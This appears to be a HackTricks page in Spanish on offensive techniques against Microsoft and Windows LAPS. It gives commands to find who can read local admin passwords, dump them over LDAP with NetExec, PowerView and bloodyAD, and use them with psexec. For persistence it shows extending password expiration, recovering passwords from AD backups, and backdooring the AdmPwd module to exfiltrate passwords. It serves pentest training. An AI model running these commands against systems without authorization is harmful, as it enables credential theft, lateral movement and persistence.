# LAPS

{{#include ../../banners/hacktricks-training.md}}


## Información básica

Actualmente hay **2 modalidades de LAPS** que puedes encontrar durante un assessment:

- **Legacy Microsoft LAPS**: almacena la contraseña del administrador local en **`ms-Mcs-AdmPwd`** y el tiempo de expiración en **`ms-Mcs-AdmPwdExpirationTime`**.
- **Windows LAPS** (integrado en Windows desde las actualizaciones de abril de 2023): todavía puede emular el modo legacy, pero en el modo nativo utiliza atributos **`msLAPS-*`**, admite **cifrado de contraseñas**, **historial de contraseñas** y **backup de la contraseña DSRM** para controladores de dominio.

LAPS está diseñado para gestionar las **contraseñas de los administradores locales**, haciendo que sean **únicas, aleatorias y cambiadas frecuentemente** en los equipos unidos al dominio. Si puedes leer esos atributos, normalmente puedes **hacer pivot como administrador local** hacia el host afectado. En muchos entornos, lo interesante no es solo leer la contraseña, sino también encontrar **a quién se le delegó el acceso** a los atributos de contraseña.

### Atributos de Legacy Microsoft LAPS

En los objetos de equipo del dominio, la implementación de Legacy Microsoft LAPS da como resultado la adición de dos atributos:<sup>[[1]](#references)</sup>

- **`ms-Mcs-AdmPwd`**: **contraseña del administrador en texto plano**
- **`ms-Mcs-AdmPwdExpirationTime`**: **tiempo de expiración de la contraseña**

### Atributos de Windows LAPS

Windows LAPS nativo añade varios atributos nuevos a los objetos de equipo:<sup>[[2]](#references)</sup>

- **`msLAPS-Password`**: blob de contraseña en texto claro almacenado como JSON cuando el cifrado no está habilitado
- **`msLAPS-PasswordExpirationTime`**: tiempo de expiración programado
- **`msLAPS-EncryptedPassword`**: contraseña actual cifrada
- **`msLAPS-EncryptedPasswordHistory`**: historial de contraseñas cifrado
- **`msLAPS-EncryptedDSRMPassword`** / **`msLAPS-EncryptedDSRMPasswordHistory`**: datos cifrados de la contraseña DSRM para controladores de dominio
- **`msLAPS-CurrentPasswordVersion`**: seguimiento de versiones basado en GUID utilizado por la lógica más reciente de detección de rollback (esquema de bosque de Windows Server 2025)

Cuando **`msLAPS-Password`** es legible, el valor es un objeto JSON que contiene el nombre de la cuenta, la hora de actualización y la contraseña en texto claro, por ejemplo:<sup>[[2]](#references)</sup>
```json
{"n":"Administrator","t":"1d8161b41c41cde","p":"A6a3#7%..."}
```
### Comprobar si está activado
```bash
# Legacy Microsoft LAPS policy
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Native Windows LAPS binaries / PowerShell module
Get-Command *Laps*
dir "$env:windir\System32\LAPS"

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Legacy Microsoft LAPS-enabled computers (any Domain User can usually read the expiration attribute)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" |
? { $_."ms-mcs-admpwdexpirationtime" -ne $null } |
select DnsHostname

# Native Windows LAPS-enabled computers
Get-DomainObject -LDAPFilter '(|(msLAPS-PasswordExpirationTime=*)(msLAPS-EncryptedPassword=*)(msLAPS-Password=*))' |
select DnsHostname
```
## Acceso a contraseñas de LAPS

Puedes **descargar la raw LAPS policy** desde `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` y luego usar **`Parse-PolFile`** del paquete [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) para convertir este archivo a un formato legible.

### Legacy Microsoft LAPS PowerShell cmdlets

Si el módulo legacy LAPS está instalado, los siguientes cmdlets suelen estar disponibles:
```bash
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read the LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
### cmdlets de PowerShell de Windows LAPS

Native Windows LAPS incluye un nuevo módulo de PowerShell y nuevos cmdlets:
```bash
Get-Command *Laps*

# Discover who has extended rights over the OU
Find-LapsADExtendedRights -Identity Workstations

# Read a password from AD
Get-LapsADPassword -Identity wkstn-2 -AsPlainText

# Include password history if encryption/history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory

# Query DSRM password from a DC object
Get-LapsADPassword -Identity dc01.contoso.local -AsPlainText

# Use alternate credentials for an authorized decryptor
$cred = Get-Credential CONTOSO\LAPSDecryptor
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -DecryptionCredential $cred
```
Algunos detalles operativos son importantes:<sup>[[3]](#references)</sup>

- **`Get-LapsADPassword`** gestiona automáticamente **legacy LAPS**, **clear-text Windows LAPS** y **encrypted Windows LAPS**.
- Si la contraseña está cifrada y puedes **leerla**, pero no **descifrarla**, el cmdlet devuelve metadatos como **`Source`**, **`DecryptionStatus`** y **`AuthorizedDecryptor`**, incluso cuando no puede devolver la contraseña en texto claro.
- En **encrypted Windows LAPS**, el **permiso de lectura** y el **permiso de descifrado** son **controles diferentes**. Tener acceso de lectura al objeto / OU no significa automáticamente que puedas descifrar **`msLAPS-EncryptedPassword`**.
- El **historial de contraseñas** solo está disponible cuando el **cifrado de Windows LAPS** está habilitado.
- En los controladores de dominio, el origen devuelto puede ser **`EncryptedDSRMPassword`**.

Esto resulta útil durante un assessment porque el campo **`AuthorizedDecryptor`** indica **para qué usuario o grupo se cifró el blob**, lo que a menudo convierte una lectura fallida de la contraseña en un nuevo objetivo de privilege-escalation.

### PowerView / LDAP

**PowerView** también se puede usar para averiguar **quién puede leer la contraseña y leerla**:
```bash
# Legacy Microsoft LAPS: find principals with rights over the OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Legacy Microsoft LAPS: read the password directly from LDAP
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime

# Native Windows LAPS clear-text mode
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password,msLAPS-PasswordExpirationTime
```
Si **`msLAPS-Password`** se puede leer, analiza el JSON devuelto y extrae **`p`** para obtener la contraseña y **`n`** para obtener el nombre de la cuenta de administrador local gestionada.
```bash
# Extract both the password and the real managed account name
$laps = (Get-DomainObject -Identity wkstn-2 -Properties msLAPS-Password)."msLAPS-Password" | ConvertFrom-Json
$laps.n
$laps.p
```
Ese campo **`n`** es importante en implementaciones más recientes porque **Windows LAPS automatic account management** puede dirigirse a una **custom account** en lugar de la **`Administrator`** integrada, y los sistemas más recientes **Windows 11 24H2 / Windows Server 2025** incluso pueden **randomize** el nombre de esa cuenta.<sup>[[4]](#references)</sup>

### Linux / herramientas remotas

Las herramientas modernas admiten tanto Microsoft LAPS heredado como Windows LAPS.
```bash
# NetExec / CrackMapExec lineage: dump LAPS values over LDAP
nxc ldap 10.10.10.10 -u user -p password -M laps

# Filter to a subset of computers
nxc ldap 10.10.10.10 -u user -p password -M laps -o COMPUTER='WKSTN-*'

# Use read LAPS access to authenticate to hosts at scale
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps

# If the local admin name is not Administrator
nxc smb 10.10.10.0/24 -u user-can-read-laps -p 'Passw0rd!' --laps customadmin

# Legacy Microsoft LAPS with bloodyAD
bloodyAD --host 10.10.10.10 -d contoso.local -u user -p 'Passw0rd!' \
get search --filter '(ms-mcs-admpwdexpirationtime=*)' \
--attr ms-mcs-admpwd,ms-mcs-admpwdexpirationtime
```
Notas:

- Las versiones recientes de **NetExec** admiten **`ms-Mcs-AdmPwd`**, **`msLAPS-Password`** y **`msLAPS-EncryptedPassword`**.
- **`pyLAPS`** sigue siendo útil para el **Microsoft LAPS** heredado desde Linux, pero solo apunta a **`ms-Mcs-AdmPwd`**.
- Las herramientas cross-platform más recientes, como **`LAPS4LINUX`**, las basadas en **`dpapi-ng`** y los workflows recientes de **NetExec**, también pueden gestionar **native Windows LAPS** desde hosts que no sean Windows.
- Si el entorno utiliza **encrypted Windows LAPS**, una simple lectura LDAP no es suficiente; también necesitas ser un **authorized decryptor** (o disponer de material de descifrado equivalente, como material de claves raíz DPAPI-NG del dominio sin conexión).<sup>[[5]](#references)</sup>
- En **Windows 11 24H2 / Windows Server 2025**, no asumas que el administrador local gestionado siempre es **`Administrator`**. La gestión automática de cuentas puede crear una cuenta personalizada y, opcionalmente, aleatorizar su nombre, así que descubre primero el nombre de la cuenta mediante **`n`** / **`Account`** antes de utilizar **`--laps`** a escala.<sup>[[4]](#references)</sup>

### Abuso de la sincronización de directorios

Si tienes permisos de **directory synchronization** a nivel de dominio en lugar de acceso de lectura directo sobre cada objeto de equipo, LAPS puede seguir siendo interesante.

La combinación de **`DS-Replication-Get-Changes`** con **`DS-Replication-Get-Changes-In-Filtered-Set`** o **`DS-Replication-Get-Changes-All`** puede utilizarse para sincronizar atributos **confidential / RODC-filtered**, como el **`ms-Mcs-AdmPwd`** heredado. BloodHound lo modela como **`SyncLAPSPassword`**. Consulta [DCSync](dcsync.md) para obtener información general sobre los permisos de replicación.

## LAPSToolkit

[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) facilita la enumeración de LAPS mediante varias funciones.<sup>[[6]](#references)</sup>\
Una de ellas consiste en analizar **`ExtendedRights`** para **todos los equipos con LAPS habilitado.** Esto muestra los **grupos** específicamente **delegados para leer las contraseñas de LAPS**, que a menudo son usuarios pertenecientes a grupos protegidos.\
Una **cuenta** que ha **unido un equipo** a un dominio recibe `All Extended Rights` sobre ese host, y este permiso otorga a la **cuenta** la capacidad de **leer contraseñas**. La enumeración puede mostrar una cuenta de usuario que puede leer la contraseña de LAPS en un host. Esto puede ayudarnos a **dirigirnos a usuarios específicos de AD** que pueden leer contraseñas de LAPS.
```bash
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expiration time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## Volcando contraseñas de LAPS con NetExec / CrackMapExec

Si no tienes una PowerShell interactiva, puedes abusar de este privilegio remotamente a través de LDAP:
```bash
# Legacy syntax still widely seen in writeups
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps

# Current project name / syntax
nxc ldap 10.10.10.10 -u user -p password -M laps
```
Esto extrae todos los secretos de LAPS que el usuario puede leer, lo que permite realizar movimiento lateral con una contraseña de administrador local diferente.

## Using LAPS Password
```bash
xfreerdp /v:192.168.1.1:3389 /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## Persistencia de LAPS

### Fecha de expiración

Una vez siendo admin, es posible **obtener las contraseñas** y **evitar que** una máquina **actualice** su **contraseña** estableciendo la **fecha de expiración en el futuro**.

Legacy Microsoft LAPS:
```bash
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## SYSTEM on the computer is needed
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
El LAPS nativo de Windows utiliza **`msLAPS-PasswordExpirationTime`** en su lugar:
```bash
# Read the current expiration timestamp
Get-DomainObject -Identity wkstn-2 -Properties msLAPS-PasswordExpirationTime

# Push the expiration into the future
Set-DomainObject -Identity wkstn-2 -Set @{"msLAPS-PasswordExpirationTime"="133801632000000000"}
```
> [!WARNING]
> La contraseña seguirá rotando si un **admin** utiliza **`Reset-AdmPwdPassword`** / **`Reset-LapsPassword`**, o si está habilitada la opción **No permitir que el tiempo de expiración de la contraseña sea mayor que el requerido por la directiva**.

### Advertencia sobre el rollback de snapshots en Windows LAPS recientes

Los trucos antiguos de rollback de snapshots / imágenes son **menos fiables** contra implementaciones recientes de **Windows LAPS**. En **Windows 11 24H2 / Windows Server 2025**, si el esquema del forest incluye **`msLAPS-CurrentPasswordVersion`** (**esquema del forest de Windows Server 2025**), el cliente compara un GUID almacenado localmente en caché con el valor guardado en AD y **rota inmediatamente la contraseña** cuando un rollback crea un **estado inconsistente**.

En la práctica, esto significa que la persistencia basada en snapshots o los intentos de resucitar una contraseña antigua conocida del admin local pueden fallar rápidamente en lugar de sobrevivir hasta la siguiente expiración normal.<sup>[[2]](#references)</sup>

Esta protección solo se aplica a **Windows LAPS respaldado por AD** y también depende de que la máquina revertida pueda **autenticarse nuevamente en AD**. Si la máquina ya no puede comunicarse con AD, el **historial de contraseñas** o el **acceso a backups de AD** todavía podrían salvar la situación.

### Advertencia sobre la manipulación de la gestión automática de cuentas

Cuando la **gestión automática de cuentas** está habilitada, Windows LAPS controla el ciclo de vida de la cuenta de admin local gestionada. Los intentos inesperados de renombrar, reconfigurar o manipular de cualquier otra forma esa cuenta pueden rechazarse con **`STATUS_POLICY_CONTROLLED_ACCOUNT`** / **`ERROR_POLICY_CONTROLLED_ACCOUNT`**, por lo que la persistencia que depende de modificar silenciosamente la cuenta gestionada por LAPS es menos fiable en endpoints recientes.<sup>[[4]](#references)</sup>

### Recuperación de contraseñas históricas desde backups de AD

Cuando el **cifrado de Windows LAPS + el historial de contraseñas** están habilitados, los backups montados de AD pueden convertirse en una fuente adicional de secretos. Si puedes acceder a un snapshot montado de AD y utilizar el **recovery mode**, puedes consultar contraseñas almacenadas antiguas sin comunicarte con un DC activo.<sup>[[3]](#references)</sup>
```bash
# Query a mounted AD snapshot on port 50000
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -Port 50000 -RecoveryMode

# Historical entries if history is enabled
Get-LapsADPassword -Identity wkstn-2 -AsPlainText -IncludeHistory -Port 50000 -RecoveryMode
```
Esto es principalmente relevante durante el **robo de backups de AD**, el **abuso de forensics offline** o el **acceso a medios de disaster recovery**.

### Backdoor

El código fuente original de Microsoft LAPS legacy se puede encontrar [aquí](https://github.com/GreyCorbel/admpwd), por lo que es posible insertar un backdoor en el código (por ejemplo, dentro del método `Get-AdmPwdPassword` en `Main/AdmPwd.PS/Main.cs`) que de alguna forma **exfiltre las contraseñas nuevas o las almacene en algún sitio**.

A continuación, compila el nuevo `AdmPwd.PS.dll` y súbelo a la máquina en `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (y cambia la fecha de modificación).

## Referencias

- [1] [Introducción a Microsoft LAPS – Solución de contraseñas de administrador local](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)
- [2] [Esquema de Windows LAPS y extensiones de derechos para Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-technical-reference)
- [3] [Primeros pasos con Windows LAPS y Windows Server Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory)
- [4] [Modos de administración de cuentas de Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-account-management-modes)
- [5] [Aspectos internos de LAPS 2.0 - Blog de XPN Infosec](https://blog.xpnsec.com/lapsv2-internals/)
- [6] [LAPSToolkit - leoloobeek](https://github.com/leoloobeek/LAPSToolkit)

{{#include ../../banners/hacktricks-training.md}}
